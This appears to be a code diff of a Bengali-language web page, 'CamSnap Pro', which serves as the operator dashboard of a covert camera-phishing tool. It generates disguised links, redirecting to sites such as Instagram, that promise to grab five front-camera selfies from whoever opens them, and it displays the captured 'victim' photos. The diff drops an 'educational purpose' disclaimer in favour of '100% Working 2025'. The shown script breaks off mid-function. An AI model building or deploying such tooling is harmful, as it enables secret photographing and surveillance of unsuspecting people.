@@ -1,124 +1,102 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>CamSnap • Secret Camera Access</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CamSnap • Secret Selfie Grabber</title>
   <style>
-    :root { --bg: #f8f9fa; --card: #ffffff; --text: #1a1a1a; --accent: #0066ff; --border: #e0e0e0; }
-    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
-    body { background:var(--bg); color:var(--text); min-height:100vh; display:flex; flex-direction:column; }
-
-    /* হেডার */
-    header {
-      background:#fff; padding:20px 0; text-align:center; border-bottom:2px solid var(--border);
-      box-shadow:0 2px 10px rgba(0,0,0,0.05);
-    }
-    header img { height:60px; border-radius:8px; }
-
-    /* মেইন কন্টেন্ট */
-    main { flex:1; padding:30px 15px; max-width:520px; margin:0 auto; width:100%; }
-    .card { background:var(--card); border-radius:16px; padding:30px; box-shadow:0 8px 30px rgba(0,0,0,0.08); border:1px solid var(--border); }
-    h1 { font-size:2.2em; margin-bottom:12px; text-align:center; color:#222; }
-    p.desc { text-align:center; color:#555; font-size:1.1em; margin-bottom:25px; line-height:1.6; }
-
-    button {
-      background:var(--accent); color:white; border:none; padding:16px 24px; font-size:1.15em;
-      border-radius:12px; cursor:pointer; width:100%; font-weight:600; margin:15px 0;
-      transition:0.3s; box-shadow:0 4px 15px rgba(0,102,255,0.3);
-    }
-    button:hover { transform:translateY(-2px); box-shadow:0 8px 25px rgba(0,102,255,0.4); }
-
-    /* লিংক বক্স */
-    #linkBox { margin:25px 0; padding:20px; background:#f9f9ff; border-radius:12px; border:2px dashed #0066ff; display:none; }
-    input[type="text"] { width:100%; padding:14px; margin:10px 0; border:1px solid #ddd; border-radius:10px; font-size:1em; }
-    .small-btn { background:#333; padding:10px 20px; font-size:0.95em; margin:5px; display:inline-block; width:auto; }
-
-    /* ছবি গ্রিড */
-    .photos { display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:15px; margin-top:30px; }
-    .photos img { width:100%; height:180px; object-fit:cover; border-radius:12px; border:3px solid #0066ff; cursor:pointer;
-                  box-shadow:0 4px 15px rgba(0,0,0,0.1); transition:0.3s; }
-    .photos img:hover { transform:scale(1.05); box-shadow:0 10px 30px rgba(0,102,255,0.3); }
-    .loading { text-align:center; padding:40px; color:#666; font-size:1.1em; }
-
-    footer { text-align:center; padding:20px; background:#fff; color:#777; font-size:0.9em; border-top:1px solid #eee; }
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
+    body{background:#f8f9fa;color:#222;line-height:1.6;}
+    header{background:#fff;padding:20px;text-align:center;border-bottom:2px solid #eee;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
+    header img{height:55px;border-radius:8px;}
+    main{max-width:520px;margin:20px auto;padding:0 15px;}
+    .card{background:#fff;border-radius:16px;padding:30px;box-shadow:0 8px 30px rgba(0,0,0,0.08);border:1px solid #eee;}
+    h1{font-size:2em;text-align:center;margin-bottom:10px;}
+    p{text-align:center;color:#555;margin-bottom:25px;}
+    button{background:#0066ff;color:#fff;border:none;padding:16px;font-size:1.1em;border-radius:12px;width:100%;cursor:pointer;font-weight:600;}
+    button:hover{background:#0052cc;}
+    #linkBox{margin-top:25px;padding:20px;background:#f0f7ff;border:2px dashed #0066ff;border-radius:12px;display:none;}
+    input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:10px;font-size:1em;}
+    .btn-small{display:inline-block;width:auto;padding:10px 20px;margin:5px;font-size:0.95em;}
+    .photos{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:15px;margin-top:30px;}
+    .photos img{width:100%;height:160px;object-fit:cover;border-radius:12px;border:3px solid #0066ff;cursor:pointer;box-shadow:0 4px 15px rgba(0,102,255,0.3);}
+    .loading{text-align:center;padding:40px;color:#666;font-size:1.1em;}
+    footer{text-align:center;padding:20px;color:#777;font-size:0.9em;background:#fff;border-top:1px solid #eee;}
   </style>
 </head>
 <body>
 
 <header>
-  <img src="https://i.imgur.com/your-logo-here.png" alt="CamSnap Logo"> <!-- এখানে তোমার লগো দিবি -->
+  <img src="https://i.imgur.com/7K8vR2p.png" alt="CamSnap">
 </header>
 
 <main>
   <div class="card">
     <h1>CamSnap Pro</h1>
-    <p class="desc">
-      একটি লিংক তৈরি করো — কেউ খুললেই তার ফ্রন্ট ক্যামেরা থেকে ৫টা সেলফি অটো চলে আসবে!
-    </p>
+    <p>একটা লিংক বানাও — কেউ খুললেই তার ফ্রন্ট ক্যামেরা থেকে ৫টা সেলফি চলে আসবে!</p>
 
-    <button onclick="generateLink()">নতুন ক্যাম লিংক তৈরি করুন</button>
+    <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
 
     <div id="linkBox">
-      <p style="text-align:center; color:#0066ff; font-weight:600; margin-bottom:15px;">তোমার সিক্রেট লিংক রেডি!</p>
-      
-      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেখানে পাঠাবে)" value="https://www.instagram.com">
+      <p style="text-align:center;color:#0066ff;font-weight:600;">তোমার লিংক রেডি!</p>
 
-      <input type="text" id="victimLink" readonly style="background:#f0f0f0; font-weight:500;">
+      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেমন: https://instagram.com)" value="">
 
-      <div style="text-align:center; margin-top:15px;">
-        <button class="small-btn" onclick="copyLink()">কপি করুন</button>
-        <button class="small-btn" onclick="updateLink()" style="background:#0066ff;">আপডেট</button>
+      <input type="text" id="victimLink" readonly style="background:#f8f9fa;font-weight:500;margin-top:15px;">
+
+      <div style="text-align:center;">
+        <button class="btn-small" onclick="saveAndUpdate()">সেভ ও আপডেট করুন</button>
+        <button class="btn-small" style="background:#28a745;" onclick="copyLink()">কপি করুন</button>
       </div>
 
-      <div style="text-align:center; margin-top:15px;">
-        <a href="" id="testLink" target="_blank" style="color:#0066ff; text-decoration:underline;">মোবাইলে টেস্ট করো</a>
+      <div style="text-align:center;margin-top:15px;">
+        <a href="" id="testLink" target="_blank" style="color:#0066ff;text-decoration:underline;">মোবাইলে টেস্ট করো</a>
       </div>
     </div>
 
-    <!-- ভিকটিমের ছবি এখানে দেখাবে -->
     <div id="photos" class="photos">
-      <div class="loading">নতুন লিংক বানালে এখানে ভিকটিমের সেলফি আসবে...</div>
+      <div class="loading">নতুন লিংক বানালে এখানে সেলফি ছবি আসবে...</div>
     </div>
   </div>
 </main>
 
-<footer>
-  Developed By <strong style="color:#000;">H4X0R</strong> • For Educational Purpose Only
-</footer>
+<footer>Developed by H4X0R • 100% Working 2025</footer>
 
 <script>
 let currentId = null;
+const base = location.href.split('index.html')[0];
 
 function generateLink() {
   currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
-  const redirect = encodeURIComponent(document.getElementById("redirectUrl").value || "https://google.com");
-  const victimUrl = location.href.split('index.html')[0] + 'view.html?id=' + currentId + '&r=' + redirect;
-
+  updateVictimLink();
   document.getElementById("linkBox").style.display = "block";
-  document.getElementById("victimLink").value = victimUrl;
-  document.getElementById("testLink").href = victimUrl;
-
   document.getElementById("photos").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম ক্যামেরা অন করলেই ছবি আসবে</div>`;
-  startLiveCheck();
+  startChecking();
 }
 
-function updateLink() {
-  const redirect = encodeURIComponent(document.getElementById("redirectUrl").value);
-  const victimUrl = location.href.split('index.html')[0] + 'view.html?id=' + currentId + '&r=' + redirect;
-  document.getElementById("victimLink").value = victimUrl;
-  document.getElementById("testLink").href = victimUrl;
-  alert("লিংক আপডেট হয়েছে!");
+function saveAndUpdate() {
+  updateVictimLink();
+  alert("লিংক সেভ ও আপডেট হয়েছে!");
+}
+
+function updateVictimLink() {
+  const redirect = document.getElementById("redirectUrl").value.trim();
+  let url = `${base}view.html?id=${currentId}`;
+  if (redirect && redirect !== "") {
+    url += `&r=${encodeURIComponent(redirect)}`;
+  }
+  document.getElementById("victimLink").value = url;
+  document.getElementById("testLink").href = url;
 }
 
 function copyLink() {
   const link = document.getElementById("victimLink");
-  link.select(); link.setSelectionRange(0, 99999);
+  link.select();
   navigator.clipboard.writeText(link.value);
   alert("লিংক কপি হয়ে গেছে!");
 }
 
-function startLiveCheck() {
+function startChecking() {
   if (!currentId) return;
   const check = () => {
     const data = localStorage.getItem('camsnap_' + currentId);
